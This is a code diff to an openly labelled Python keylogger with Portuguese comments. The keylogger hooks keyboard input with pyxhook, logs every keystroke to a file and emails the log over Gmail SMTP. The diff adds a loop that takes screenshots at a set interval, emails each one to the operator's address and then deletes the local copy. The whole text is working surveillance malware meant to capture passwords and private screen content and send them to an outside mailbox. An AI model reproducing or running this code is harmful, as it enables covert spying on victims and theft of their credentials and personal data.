@@ -19,9 +19,12 @@ import pyxhook
 import datetime,os,sys
 import argparse as args
 import smtplib
+from time import *
+import pyscreenshot as ImageGrab
 from email.MIMEMultipart import MIMEMultipart
 from email.MIMEBase import MIMEBase
 from email.MIMEText import MIMEText
+from email.mime.image import MIMEImage
 from email import Encoders
 from email.Utils import COMMASPACE, formatdate
 
@@ -30,6 +33,7 @@ parser = args.ArgumentParser()
 parser.add_argument("-e", "--email",required=True,help="Your email to send the logs")
 parser.add_argument("-p", "--password",required=True,help="Your password to the program send the logs")
 parser.add_argument("-l", "--local",required=False,type=str,default="/tmp/logs.txt",help="the place where do you will put the logs")
+parser.add_argument("-t", "--time",required=False,type=int,default=60,help="is the time the Screenshots is will be sended to your email ")
 
 parsed_args = parser.parse_args()
 
@@ -38,17 +42,60 @@ data_hora = str(data_hora).split('.')[0].replace(' ','_')###
 sendTo = parsed_args.email #para onde você ira enviar o arquivo
 assunto = 'Keylogger %s' %data_hora
 mensagem = ' the keylogger dumped it %s '%data_hora #mensagem é também pega a data é a hora do pc 
-youremail =parsed_args.email
+youremail = parsed_args.email
 password = parsed_args.password
-servidor= 'smtp.gmail.com' #o servidor pode ser do gmail dentre outros
-porta = 587
+server= 'smtp.gmail.com' #o servidor pode ser do gmail dentre outros
+port = 587
+sendtime = parsed_args.time
 log_file = parsed_args.local
 
+
+def send_Image(image):
+  img_data = open(image, 'rb').read()
+  msg = MIMEMultipart()
+  From = youremail
+  To = youremail
+
+  msg['Subject'] = 'Screenshots'
+  msg['From'] = From
+  msg['To'] = To
+
+  text = MIMEText('keylogger images')
+  msg.attach(text)
+  fp = open(image, 'rb')
+  msgImage = MIMEImage(fp.read())
+  fp.close()
+  msg.attach(msgImage)
+
+  s = smtplib.SMTP(server, port)
+  s.ehlo()
+  s.starttls()
+  s.ehlo()
+  s.login(youremail, password)
+  s.sendmail(From, To, msg.as_string())
+  s.quit()
+
+def screenshot():
+  while True:
+    im = ImageGrab.grab()
+
+    for i in range(100):
+      sleep(sendtime)
+      atual_image = i
+      im.save(str(i), 'jpeg')
+
+      if i == atual_image:
+        dic = os.getcwd() + "/" + str(i) 
+
+        send_Image(dic)
+        os.remove(dic)
+     
+
 #essa funão gerencia cria os heards dentre outras coisas 
-def send_email(servidor, porta, FROM, PASS, TO, subject, texto, anexo=[]):
-  global saida
-  servidor = servidor
-  porta = porta
+def send_email(server, port, FROM, PASS, TO, subject, texto, anexo=[]):
+  global exit 
+  server = server
+  port = port
   FROM = FROM
   PASS = PASS
   TO = TO
@@ -69,7 +116,7 @@ def send_email(servidor, porta, FROM, PASS, TO, subject, texto, anexo=[]):
     msg.attach(part)
 
   try:
-    gm = smtplib.SMTP(servidor,porta)
+    gm = smtplib.SMTP(server,port)
     gm.ehlo()
     gm.starttls()
     gm.ehlo()
@@ -81,17 +128,22 @@ def send_email(servidor, porta, FROM, PASS, TO, subject, texto, anexo=[]):
     errorMsg = "Nao Foi Possivel Enviar o Email.\n Error: %s" % str(e)
     print('%s'%errorMsg)
 
-def OnKeyPress(event): #essa função pega as teclas que foram precionadas
-  fob=open(log_file,'a')
-  fob.write(event.Key)
-  fob.write('\n')
+try:
 
-  if event.Ascii==59: #59 se esse valor e representado por ; se for precionada ele ira parar o keylogger e ira mandar o email
-    fob.close()
-    new_hook.cancel()
-    send_email(servidor, porta, youremail, password, sendTo, assunto, mensagem,[log_file])
+  def OnKeyPress(event): #essa função pega as teclas que foram precionadas
+    fob=open(log_file,'a')
+    fob.write(event.Key)
+    fob.write('\n')
 
-new_hook = pyxhook.HookManager()
-new_hook.KeyDown= OnKeyPress
-new_hook.HookKeyboard()
-new_hook.start()
+    if event.Ascii==59: #59 se esse valor e representado por ; se for precionada ele ira parar o keylogger e ira mandar o email
+      fob.close()
+      new_hook.cancel()
+      send_email(server, port, youremail, password, sendTo, assunto, mensagem,[log_file])
+
+  new_hook = pyxhook.HookManager()
+  new_hook.KeyDown= OnKeyPress
+  new_hook.HookKeyboard()
+  new_hook.start()
+  screenshot()
+except(KeyboardInterrupt):
+  print("Sorry Not Day")
